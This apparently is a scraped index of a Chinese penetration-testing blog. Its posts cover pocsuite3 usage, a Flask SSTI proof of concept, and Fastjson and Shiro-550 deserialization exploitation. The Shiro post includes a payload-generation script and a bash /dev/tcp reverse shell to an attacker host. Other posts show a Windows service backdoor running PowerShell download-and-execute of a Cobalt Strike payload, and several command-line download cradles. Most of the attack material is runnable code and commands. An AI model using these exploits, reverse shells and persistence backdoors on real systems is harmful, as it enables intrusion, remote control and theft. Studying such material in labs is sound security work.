verify 模式：验证目标是否存在漏洞: # -r POC 加载POCfile 或者 remote from seebug websit # -u URL pocsuite -r tests/poc_example.py -u http://www.example.com/ --verify attack 模式：向目标发起有效的攻击: pocsuite -r tests/poc_example.py -u http://www.example.com/ --attack 批量验证，将url写到一个txt: # -f url_file（多个url） pocsuite -r test/poc_example.py -f url.txt --verify 加载 tests 目录下的所有 PoC 对目标进行测试（可以充当扫描器角色）: pocsuite -r tests/ -u http://www.example.com --verify 使用多线程，默认线程数为1: pocsuite -r test/ -f url.txt --verify --threads 10 使用shell交互模式，对目标进行远程控制： pocsuite -u http://example.com -r example.py -v 2 --shell 从seebug下载poc # -c configfile 加载选项from a configuration INI file 如果是压缩包解压zip源码的方式，运行脚本方式如下，切换到pocsuite3目录，运行cli.py文件： python cli.py -u x.x.x.x -r example.py --verify 一些模块接口 --dork (默认为zoomeye搜索搜索引擎) --dork-zoomeye 搜过关键字 --dork-shodan 搜索关键字 --dork-censys 搜索关键字 --max-page 多少页 --search-type 搜索类型选择API,Web or Host --vul-keyword seebug关键词搜索 --ssv-id seebug漏洞编号 --lhost shell模式反弹主机 --lport shell模式反弹端口 --comparison 比较两个搜索引擎 # eg:从ZoomEye中调用host批量验证某个POC： pocsuite -r weblogic_CVE-2017-10271.py --dork 'weblogic' --max-page 5 --thread 20 --verify Optimization 其他选项 --plugins 加载插件 --pocs-path poc地址 --threads 开启线程 --batch 自动默认选项 --requires 检测需要安装的模块 --quiet 没有logger --ppt 隐藏敏感信息 console模式 poc-console进入console模式 Global commands: help 帮助 use \u003cmodule\u003e 使用模块 search \u003csearch term\u003e 搜索模块 list|show all 显示所有模块 exit 退出 Module commands: run 使用设置的参数运行选中的脚本 back 返回上一步 set 参数名 参数值(当前模块) setg 参数名 参数值(所有模块) show info|options|all 打印information,options check 使用--verify模式 attack 使用--attack模式 exploit 使用--shell模式 其他参数 optional arguments: -h, --help show this help message and exit --version Show program's version number and exit --update Update Pocsuite -v {0,1,2,3,4,5,6} Verbosity level: 0-6 (default 1) Target: At least one of these options has to be provided to define the target(s) -u URL [URL ...], --url URL [URL ...] Target URL (e.g. \"http://www.site.com/vuln.php?id=1\") -f URL_FILE, --file URL_FILE Scan multiple targets given in a textual file -r POC [POC ...] Load POC file from local or remote from seebug website -c CONFIGFILE Load options from a configuration INI file Mode: Pocsuite running mode options --verify Run poc with verify mode --attack Run poc with attack mode --shell Run poc with shell mode Request: Network request options --cookie COOKIE HTTP Cookie header value --host HOST HTTP Host header value --referer REFERER HTTP Referer header value --user-agent AGENT HTTP User-Agent header value --random-agent Use randomly selected HTTP User-Agent header value --proxy PROXY Use a proxy to connect to the target URL --proxy-cred PROXY_CRED Proxy authentication credentials (name:password) --timeout TIMEOUT Seconds to wait before timeout connection (default 30) --retry RETRY Time out retrials times. --delay DELAY Delay between two request of one thread --headers HEADERS Extra headers (e.g. \"key1: value1\\nkey2: value2\") Account: Telnet404、Shodan、CEye、Fofa account options --login-user LOGIN_USER Telnet404 login user --login-pass LOGIN_PASS Telnet404 login password --shodan-token SHODAN_TOKEN Shodan token --fofa-user FOFA_USER fofa user --fof","date":"2021-01-11","objectID":"/pocsuite%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:0:3","tags":["开源渗透框架","pocsuite"],"title":"pocsuite简单学习","uri":"/pocsuite%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"编写POC插件 详见pocsuite3下docs目录 POC注意事项 参照模版来写：模版地址：https://www.seebug.org/contribute/vul 引入基础库，尽量避免第三方库。 比较好的POC符合： 随机性：检测的数据，发送的数据要随机 通用性：考虑适应版本，各种不同的情况，操作系统等。 确定性：准确率的问题，这个POC一定能检测出漏洞来吗？ 关于CEYE的使用：监视服务以进行安全测试 有时一些漏洞的检测并没有数据回显，如SQL盲注，如命令执行无回显等等。这时可以借助DNS查询nslook或者curl来监控数据。CEYE为我们提供了这样一种服务，地址：http://ceye.io。 举例 这里以Flask SSTI为例： \"\"\" 功能：使用pocsuite对flask模板注入进行检测和利用 @author: 剑胆琴心 pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000 --verify __class__ 返回类型所属的对象（类） __mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 __base__ 返回该对象所继承的基类 // __base__和__mro__都是用来寻找基类的 __subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 __init__ 类的初始化方法 __globals__ 对包含函数全局变量的字典的引用 \"\"\" from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY # from pocsuite3.api import get_listener_ip, get_listener_port # from pocsuite3.api import REVERSE_PAYLOAD # from pocsuite3.lib.utils import random_str class FlaskPOCEXP(POCBase): ''' 0.编写的文件名应该符合poc命名规范：\"组成漏洞应用名_版本号_漏洞类型名称\", 其中文件名中所有字母改为小写，所有特殊符号改为下划线 1.编写DemoPOC类，继承自POCBase类 2.填写POC信息字段（如下）： ''' vulID = '0' # ssvid ID，如果是提交漏洞同时提交POC，写成0 version = '1' # 默认为1 author = ['剑胆琴心'] # POC作者的名字 vulDate = '2021-01-11' # 漏洞公开的时间，不明确时可以写今天（我瞎写的时间） createDate = '2021-01-11' updateDate = '2021-01-11' references = ['http://www.xpshuai.cn'] # 漏洞地址来源，0day可以不写 name = 'Python Flask SSTI(服务端模板注入)漏洞' # POC名称 appPowerLink = 'http://www.xpshuai.cn' # 漏洞厂商的主页地址 appName = 'Flask' # 漏洞应用名称 appVersion = 'All' # 漏洞影响版本 # vulType = VUL_TYPE.OTHER # 漏洞类型(这里我瞎选的) desc = ''' SSTI(Server-Side Template Injection)服务端模板注入， 就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式 ''' samples = [''] # 漏洞样例，使用poc测试成功的网站 # PoC 第三方模块依赖说明。PoC 编写的时候要求尽量不要使用第三方模块，如果必要使用，请在 PoC 的基础信息部分，增加 install_requires 字段，按照以下格式：install_requies = [pip时候的模块名, pip时候的模块名]填写依赖的模块名。 install_requies = [] def _verify(self): ''' 验证模式 ''' result = {} # 这里写验证代码... path = \"/?name=\" url = self.url + path payload = \"{{22*22}}\" # 第一次请求 try: resq = requests.get(url + payload) if resq and resq.status_code == 200 and \"484\" in resq.text: result['VerifyInfo'] = {} # 创建自定义的字典信息 result['VerifyInfo']['URL'] = url result['VerifyInfo']['Payload'] = payload except Exception as e: pass return self.parse_output(result) def _attack(self): ''' 攻击模式 ''' result = {} path = \"/?name=\" url = self.url + path payload = \"%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D\" try: resq = requests.get(url + payload) if resq and resq.status_code == 200 and \"www\" in resq.text: result['VerifyInfo'] = {} result['VerifyInfo']['URL'] = url result['VerifyInfo']['Name'] = payload except Exception as e: pass return self.parse_output(result) def parse_output(self, result): ''' 检测返回结果数据统一封装到这个方法里进行处理 ''' output = Output(self) if result: output.success(result) else: output.fail('target is not vulnerable') return output # 注册POC类，千万不要忘记哦~~~ register_poc(FlaskPOCEXP) 若是压缩包方式下载的：放到pocsuite下的pocs目录，然后python cli.py xxxxx方式运行 若是pip方式下载的：按下面方式 验证漏洞： pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000 --verify 攻击： pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000 --attack command外部参数传递。 改进一下，希望可以接收用户输入的命令行参数，对目标系统实现半交互控制 \"\"\" 功能：使用pocsuite对flask模板注入进行检测和利用 @author: 剑胆琴心 @使用方法： pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000 --verify pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000 --verify --command 'id' \"\"\" from collections import OrderedDict from pocsuite3.api import Output, POCBase, register_poc, reque","date":"2021-01-11","objectID":"/pocsuite%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/:0:4","tags":["开源渗透框架","pocsuite"],"title":"pocsuite简单学习","uri":"/pocsuite%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"前几天重新读了一下道哥的《白帽子讲Web安全》，于是做了个粗略的思维导图： xmind原始格式地址：https://www.jianguoyun.com/p/DX5jC4wQ59WFCBjWvtYD ","date":"2021-01-03","objectID":"/web%E5%AE%89%E5%85%A8%E7%AE%80%E8%A6%81%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/:0:0","tags":["Web安全","读书笔记"],"title":"Web安全简要思维导图","uri":"/web%E5%AE%89%E5%85%A8%E7%AE%80%E8%A6%81%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"},{"categories":["Linux"],"content":"概述 安装 sudo apt-get install lrzsz 常见参数 参数 参数说明 -a 以文本方式传输（ascii） -b 以二进制方式传输（binary） -e 对控制字符转义（escape），这可以保证文件传输正确 两个命令： sz：从xshell里面的服务器下载文件到本机 rz：从主机上传文件到xshell里面的服务器 ","date":"2020-12-04","objectID":"/%E4%BD%BF%E7%94%A8sz%E4%B8%8Erz%E5%91%BD%E4%BB%A4%E5%9C%A8xshell%E4%B8%8A%E4%B8%8B%E8%BD%BD%E5%92%8C%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/:0:1","tags":["Linux","lrzsz","xshell","文件传输"],"title":"使用sz与rz命令在Xshell上下载和上传文件","uri":"/%E4%BD%BF%E7%94%A8sz%E4%B8%8Erz%E5%91%BD%E4%BB%A4%E5%9C%A8xshell%E4%B8%8A%E4%B8%8B%E8%BD%BD%E5%92%8C%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/"},{"categories":["Linux"],"content":"sz用法： 下载一个文件 sz file_name 下载多个文件 sz file_name1 file_name2 下载指定目录下的所有文件，不包含该目录下的文件夹 sz test_dir/* ","date":"2020-12-04","objectID":"/%E4%BD%BF%E7%94%A8sz%E4%B8%8Erz%E5%91%BD%E4%BB%A4%E5%9C%A8xshell%E4%B8%8A%E4%B8%8B%E8%BD%BD%E5%92%8C%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/:0:2","tags":["Linux","lrzsz","xshell","文件传输"],"title":"使用sz与rz命令在Xshell上下载和上传文件","uri":"/%E4%BD%BF%E7%94%A8sz%E4%B8%8Erz%E5%91%BD%E4%BB%A4%E5%9C%A8xshell%E4%B8%8A%E4%B8%8B%E8%BD%BD%E5%92%8C%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/"},{"categories":["Linux"],"content":"rz用法： 输入rz回车后，会出现文件选择对话框，选择需要上传文件，一次可以指定多个文件，上传到服务器的路径为当前执行rz命令的目录。 ","date":"2020-12-04","objectID":"/%E4%BD%BF%E7%94%A8sz%E4%B8%8Erz%E5%91%BD%E4%BB%A4%E5%9C%A8xshell%E4%B8%8A%E4%B8%8B%E8%BD%BD%E5%92%8C%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/:0:3","tags":["Linux","lrzsz","xshell","文件传输"],"title":"使用sz与rz命令在Xshell上下载和上传文件","uri":"/%E4%BD%BF%E7%94%A8sz%E4%B8%8Erz%E5%91%BD%E4%BB%A4%E5%9C%A8xshell%E4%B8%8A%E4%B8%8B%E8%BD%BD%E5%92%8C%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/"},{"categories":["渗透测试"],"content":"简介 fastjson 是阿里巴巴的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。可以通过反序列化导致远程命令执行。 ","date":"2020-11-13","objectID":"/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E9%AA%8C/:1:0","tags":["Fastjson反序列化","靶场实验","漏洞复现"],"title":"Fastjson反序列化","uri":"/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E9%AA%8C/"},{"categories":["渗透测试"],"content":"漏洞检测方法 ","date":"2020-11-13","objectID":"/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E9%AA%8C/:2:0","tags":["Fastjson反序列化","靶场实验","漏洞复现"],"title":"Fastjson反序列化","uri":"/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E9%AA%8C/"},{"categories":["渗透测试"],"content":"DNSLog回显 下面有多个请求，分别放到请求数据包部分(可能某个不适用, 多试几个)，通过构造DNS解析来判断是否是Fastjson，Fastjson在解析下面这些Payload时会取解析val的值，从而可以在dnslog接收到回显，以此判断是不是Fastjson {\"a\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"xxx.dnslog.cn\"}} {\"@type\":\"java.net.Inet4Address\",\"val\":\"xxx.dnslog.cn\"} {\"@type\":\"java.net.Inet6Address\",\"val\":\"xxx.dnslog.cn\"} {\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"xxx.dnslog.cn\"}} {\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"xxx.dnslog.cn\"}}\"\"} {{\"@type\":\"java.net.URL\",\"val\":\"xxx.dnslog.cn\"}:\"aaa\"} Set[{\"@type\":\"java.net.URL\",\"val\":\"xxx.dnslog.cn\"}] Set[{\"@type\":\"java.net.URL\",\"val\":\"xxx.dnslog.cn\"} {{\"@type\":\"java.net.URL\",\"val\":\"xxx.dnslog.cn\"}:0 ","date":"2020-11-13","objectID":"/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E9%AA%8C/:2:1","tags":["Fastjson反序列化","靶场实验","漏洞复现"],"title":"Fastjson反序列化","uri":"/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E9%AA%8C/"},{"categories":["渗透测试"],"content":"增加key Java语言中常用的Json处理主要是Fastjson和Jackson，相对而言，Jackson比较严格，强制Key和JavaBean属性对齐，只能少Key不能多Key，所以可以通过增加一个Key看响应包会不会报错来判断。 ","date":"2020-11-13","objectID":"/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E9%AA%8C/:2:2","tags":["Fastjson反序列化","靶场实验","漏洞复现"],"title":"Fastjson反序列化","uri":"/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E9%AA%8C/"},{"categories":["渗透测试"],"content":"利用复现 这里用的docker环境 1.查看数据包，可以用上面的漏洞检测的方法来判断 2.vps用nc监听端口8888 nc -lvvp 8888 EXP地址：https://github.com/CaijiOrz/fastjson-1.2.47-RCE 3.修改exp中反弹shell的服务器地址和为我们的 4.使用javac进行编译，然后会生成一个Exploit.class文件 javac Exploit.java 5.在Exploit.class的目录下开启python的简单http服务，相当于访问就能下载 python -m SimpleHTTPServer 8080 6.执行下面的命令开启RMI/LDAP服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://192.168.43.102:8080/#Exploit\" 9999 #8080是前面SimpleHTTPServer的端口 7.构造exp请求包 # 1.2.47以下版本 { \"a\":{ \"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\" }, \"b\":{ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://192.168.43.102:9999/Exploit\", \"autoCommit\":true } } # 1.2.24以下版本 { \"b\":{ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://同上类文件地址:9999/TouchFile\", \"autoCommit\":true } } 8.构造好的请求包发送如下，注意：Content-type格式要json，并且是post请求 Content-type: application/json 9.接收到反弹回来的shell 参考：https://www.naraku.cn/posts/86.html ","date":"2020-11-13","objectID":"/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E9%AA%8C/:3:0","tags":["Fastjson反序列化","靶场实验","漏洞复现"],"title":"Fastjson反序列化","uri":"/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E9%AA%8C/"},{"categories":["渗透测试"],"content":"漏洞原理 Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。 Payload产生的过程： 命令=\u003e序列化=\u003eAES加密=\u003ebase64编码=\u003eRememberMe Cookie值 在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。 ","date":"2020-11-13","objectID":"/shiro-rememberme%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-shiro-550-%E5%A4%8D%E7%8E%B0/:0:1","tags":["Shiro反序列化","漏洞复现"],"title":"Shiro rememberMe反序列化漏洞(Shiro-550)复现","uri":"/shiro-rememberme%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-shiro-550-%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"影响版本 Apache Shiro \u003c 1.2.4 ","date":"2020-11-13","objectID":"/shiro-rememberme%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-shiro-550-%E5%A4%8D%E7%8E%B0/:0:2","tags":["Shiro反序列化","漏洞复现"],"title":"Shiro rememberMe反序列化漏洞(Shiro-550)复现","uri":"/shiro-rememberme%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-shiro-550-%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"特征判断 返回包中包含rememberMe=deleteMe字段 ","date":"2020-11-13","objectID":"/shiro-rememberme%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-shiro-550-%E5%A4%8D%E7%8E%B0/:0:3","tags":["Shiro反序列化","漏洞复现"],"title":"Shiro rememberMe反序列化漏洞(Shiro-550)复现","uri":"/shiro-rememberme%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-shiro-550-%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"演示 文中的配图有点不一致，别介意，环境问题 系统界面如图 抓包查看 可以看到是Shiro 1.检查是否存在默认的key 工具链接：https://github.com/insightglacier/Shiro_exploit python shiro_exploit.py -u http://\u003cIP\u003e:7080 检测的key保存下来一会用 2.制作反弹shell代码 2.1 vps监听端口 nc -lvvp 7788 2.2 Java Runtime 配合 bash 编码， 在线编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html bash -i \u003e\u0026 /dev/tcp/202.xx.xx.xx/7788 0\u003e\u00261 # ip为攻击机的地址 3.通过ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令 上一步的反弹shell的命令编码结果写到下面 java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections6 'bash -c {echo,YmFzaCAtxxxxxxzYuxxxxxxxxxxxxQ==}|{base64,-d}|{bash,-i}' # 这里用的CommonsCollections4 4.使用shiro.py 生成Payload python shiro.py 122.xx.xx.xx:6666 其中shiro.py代码如下： import sys import uuid import base64 import subprocess from Crypto.Cipher import AES def encode_rememberme(command): popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'CommonsCollections6', command], stdout=subprocess.PIPE) # 这里要注意用哪个JRMPClient BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(\"fCq+/xW488hMTCD+cmJ3aQ==\") # 这里的key要提前枚举出来 iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertext if __name__ == '__main__': payload = encode_rememberme(sys.argv[1]) print \"rememberMe={0}\".format(payload.decode()) 5.构造数据包，伪造cookie，发送Payload. 6.nc监听端口，shell成功反弹 PS：后来发现这个好用的工具，一键检测\u0026getshell，好用极了 我应该去学学java编程了，看大佬们写的各种工具，羡慕极了 ","date":"2020-11-13","objectID":"/shiro-rememberme%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-shiro-550-%E5%A4%8D%E7%8E%B0/:0:4","tags":["Shiro反序列化","漏洞复现"],"title":"Shiro rememberMe反序列化漏洞(Shiro-550)复现","uri":"/shiro-rememberme%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-shiro-550-%E5%A4%8D%E7%8E%B0/"},{"categories":["计算机网络"],"content":" 主被动模式，阐述的是数据传输过程 主被动模式，选择权在客户机上！ 所谓主或被，是站在服务器角度说的 ","date":"2020-10-13","objectID":"/ftp%E4%B8%A4%E7%A7%8D%E6%A8%A1%E5%BC%8F/:0:0","tags":["FTP","文件传输协议","主动模式 被动模式"],"title":"FTP两种模式","uri":"/ftp%E4%B8%A4%E7%A7%8D%E6%A8%A1%E5%BC%8F/"},{"categories":["计算机网络"],"content":"主动模式 端口：21端口(控制端口) + 20端口(数据端口) 传输数据的时候服务器主动–\u003e主动模式 服务器的20主动向客户机的随机端口拨号，建立数据通道 所以说，如果客户机开着防火墙，你用主动模式是连接不上FTP服务器的(服务端访问客户端的’随机’端口会被客户机防火墙拦截) 主动模式不适合客户机开防火墙时候使用 ","date":"2020-10-13","objectID":"/ftp%E4%B8%A4%E7%A7%8D%E6%A8%A1%E5%BC%8F/:0:1","tags":["FTP","文件传输协议","主动模式 被动模式"],"title":"FTP两种模式","uri":"/ftp%E4%B8%A4%E7%A7%8D%E6%A8%A1%E5%BC%8F/"},{"categories":["计算机网络"],"content":"被动模式 端口：21端口(控制端口) + 随机端口(作为数据端口) 传输数据的时候服务器被动–\u003e被动模式 客户机主动向服务器的随机端口拨号，建立数据通道 所以说，如果服务器开着防火墙，你用被动模式是连接不上FTP服务器的(客户机访问服务器的随机端口会被服务器防火墙所拦截) 被动模式不适合服务机开防火墙时候使用 ","date":"2020-10-13","objectID":"/ftp%E4%B8%A4%E7%A7%8D%E6%A8%A1%E5%BC%8F/:0:2","tags":["FTP","文件传输协议","主动模式 被动模式"],"title":"FTP两种模式","uri":"/ftp%E4%B8%A4%E7%A7%8D%E6%A8%A1%E5%BC%8F/"},{"categories":["渗透测试"],"content":"sc命令用来创建和删除windows服务 使用SC命令创建windows服务 命令格式： sc [servername] create Servicename [Optionname= Optionvalues] # servername 可选，可以使用双斜线，如\\\\\\\\myserver，也可以是\\\\\\\\192.168.0.1来操作远程计算机。如果在本地计算机上操作就不用添加任何参数。 # Servicename 在注册表中为service key制定的名称。注意这个名称是不同于显示名称的（这个名称可以用net start和服务控制面板看到），而SC是使用服务键名来鉴别服务的。 # Optionname 这个optionname和optionvalues参数允许你指定操作命令参数的名称和数值。注意，这一点很重要在操作名称和等号之间是没有空格的。 如果你想要看每个命令的可以用的optionvalues，你可以使用sc command这样的格式。这会为你提供详细的帮助。 # Optionvalues 为optionname的参数的名称指定它的数值。有效数值范围常常限制于哪一个参数的optionname。如果要列表请用sc command来询问每个命令。 示例： sc create svnservice binpath= \"\\\"D:\\Servers\\Subversion\\bin\\svnserve.exe\\\" --service -r E:\\SVN\\repository\" displayname= \"SVNService\" depend= Tcpip start= auto 注意： 在option= xxxxx格式中，=号和后面的内容一定要有空格，如depend= Tcpip 如果命令中的需要进行双引号的嵌套，使用反斜杠加引号 \\\"来进行转义处理。 使用SC命令删除windows服务 从注册表中删除服务子项。如果服务正在运行或者另一个进程有一个该服务的打开句柄，那么此服务将标记为删除。 语法： sc [ServerName] delete [ServiceName] 示例： sc delete svnservice 服务自启动后门 这里使用Cobalt Strike生成了一个powershell的下载后门的payload（菜单栏，Attacks–\u003eWeb Drive -by–\u003eScaripted Web Delivery，生成powershell后门） sc create \"Name\" binpath= \"cmd /c start powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\\\"\" sc description Name \"Just For Test\" # 设置服务的描述字符串 sc config Name start= auto # 设置这个服务为自动启动 net start Name ``# 启动服务 # 重启服务器后，成功返回一个shell ","date":"2020-09-22","objectID":"/windows-sc%E5%91%BD%E4%BB%A4/:0:0","tags":["sc","添加服务","权限维持"],"title":"Windows sc命令与权限维持","uri":"/windows-sc%E5%91%BD%E4%BB%A4/"},{"categories":["渗透测试"],"content":"当我们通过Web方式获取了一个Shell，而目标主机是Windows，我们下面后门文件到目标主机一般有两种方式： 远程下载文件到本地，然后再执行； 远程下载执行，执行过程没有二进制文件落地（这种方式已然成为后门文件下载执行的首要方式） 常见的下载方式 PowerShell Bitsadmin certutil wget ipc$文件共享 FTP TFTP WinScp msiexec IEExec mshta rundll32 regsvr32 MSXSL.EXE pubprn.vbs ","date":"2020-09-22","objectID":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:0","tags":["命令行下载文件","shell"],"title":"Windows命令行下载文件方法","uri":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"1.Powershell 远程下载文件保存在本地： powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.0.115/payload.txt','payload.exe') 远程执行命令： powershell -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/imag/evil.txt'))\" ","date":"2020-09-22","objectID":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:1","tags":["命令行下载文件","shell"],"title":"Windows命令行下载文件方法","uri":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"2.Bitsadmin bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。 bitsadmin /transfer n http://192.168.28.128/imag/evil.txt D:\\1.txt ","date":"2020-09-22","objectID":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:2","tags":["命令行下载文件","shell"],"title":"Windows命令行下载文件方法","uri":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"3.certutil 用于备份证书服务，支持xp-win10。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。 注：缓存目录为%USERPROFILE%\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content #下载文件 certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php #删除缓存 certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete ","date":"2020-09-22","objectID":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:3","tags":["命令行下载文件","shell"],"title":"Windows命令行下载文件方法","uri":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"4.wget Windows环境下，可上传免安装的可执行程序wget.exe到目标机器，然后使用wget下载文件。 下载地址：https://eternallybored.org/misc/wget/ wget -O \"evil.txt\" http://192.168.28.128/imag/evil.txt ","date":"2020-09-22","objectID":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/:0:4","tags":["命令行下载文件","shell"],"title":"Windows命令行下载文件方法","uri":"/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"},{"categories":["渗透测试"],"content":"5.ipc$文件共享 IPC$(Internet Process Connection)是共享\"命名管道\"的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。 #建立远程IPC连接 net use \\\\192.168.28.128\\ipc$ /user:administrator \"abc123!\" #复制远程文件到本地主机 copy \\\\192.168.28.128\\c$\\2.txt D:\\test 